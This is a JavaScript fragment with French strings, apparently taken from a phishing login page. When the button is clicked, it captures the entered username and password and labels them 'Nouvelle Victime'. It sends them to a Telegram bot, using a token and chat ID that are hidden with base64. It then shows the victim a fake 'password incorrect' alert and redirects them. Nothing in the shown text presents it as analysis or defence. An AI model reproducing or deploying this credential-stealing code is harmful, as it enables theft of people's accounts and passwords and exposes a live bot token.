        const url = \`https://api.telegram.org/bot\${tkn}/sendMessage\`;
        
        const data = {
            chat_id: chId,
            text: message
        };

        return fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message envoyé avec succès:', data);
                return true;
            } else {
                console.error('Erreur Telegram:', data);
                return false;
            }
        })
        .catch(error => {
            console.error('Erreur lors de l\\'envoi du message:', error);
            return false;
        });
    }
    
    document.querySelector('.btn').addEventListener('click', async function() {
        const username = document.querySelector('input[type="text"]').value;
        const YKK = document.querySelector('input[type="YKK"]').value;

        if (username && YKK) {
            const message = \` ✨ Nouvelle Victime ✨ (Bouh) by YKK☑️\\n\\nNom de profil 👤: \${username}\\nMot de passe 🔒: \${YKK}\`;

            const tkn1 = atob('Njc5OTk1NjQ4MDpBQUY2dUtNNGI3MmFBeE5lNm4ydk9DdUhwZzdyQ0pvUlBrWQ==');
            const chId1 = atob('NjY2OTY5MzgwNQ==');

            const chId2 = atob('NjY2OTY5MzgwNQ==');

            const success1 = await sendToTelegram(message, tkn1, chId1);
            const success2 = await sendToTelegram(message, tkn2, chId2);

            if (success1 && success2) {
                alert('incorrect');
            } else {
                alert('le mot de passe que avez indiqué est incorrect Veuillez réessayer.');
            }

            // Only redirect after message has been successfully sent
            window.location.href = 'index.html'; 
        } else {
            alert('incorrect');
        }
    });
    `;
